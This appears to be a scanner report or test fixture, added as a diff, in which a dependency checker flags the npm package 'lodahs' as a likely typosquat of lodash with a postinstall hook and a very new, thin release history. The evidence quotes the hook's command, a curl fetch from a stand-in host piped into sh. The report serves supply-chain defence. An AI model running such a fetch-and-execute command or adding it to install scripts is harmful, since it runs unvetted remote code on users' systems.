@@ -1,0 +1,64 @@
+{
+  "module": "dependency",
+  "status": "ok",
+  "findings": [
+    {
+      "id": "D-001",
+      "module": "dependency",
+      "category": "SUSPICIOUS_INDICATOR",
+      "severity": "HIGH",
+      "confidence": "HIGH",
+      "subject": {
+        "ecosystem": "npm",
+        "name": "lodahs",
+        "version": "1.0.0"
+      },
+      "title": "lodahs: 3 suspicious indicator(s) (INSTALL_SCRIPT, NEW_OR_THIN_PACKAGE, TYPOSQUAT)",
+      "evidence": [
+        {
+          "type": "rule_hit",
+          "rule_id": "TYPOSQUAT",
+          "data": {
+            "similar_to": "lodash",
+            "distance": 1
+          },
+          "untrusted_text": []
+        },
+        {
+          "type": "rule_hit",
+          "rule_id": "INSTALL_SCRIPT",
+          "data": {
+            "hook": "postinstall"
+          },
+          "untrusted_text": [
+            "curl http://example.invalid/run.sh | sh"
+          ]
+        },
+        {
+          "type": "rule_hit",
+          "rule_id": "NEW_OR_THIN_PACKAGE",
+          "data": {
+            "age_days": 2,
+            "version_count": 1
+          },
+          "untrusted_text": []
+        }
+      ],
+      "file_hint": "package.json",
+      "line_hint": 6
+    }
+  ],
+  "errors": [],
+  "tool_versions": {
+    "syft": "1.55.0",
+    "osv_query_time": "2026-10-31T13:39:28Z"
+  },
+  "duration_ms": 1555,
+  "checks_performed": [
+    "manifest_discovery",
+    "syft_sbom",
+    "npm_lockfile_parse",
+    "osv_lookup",
+    "heuristics"
+  ]
+}
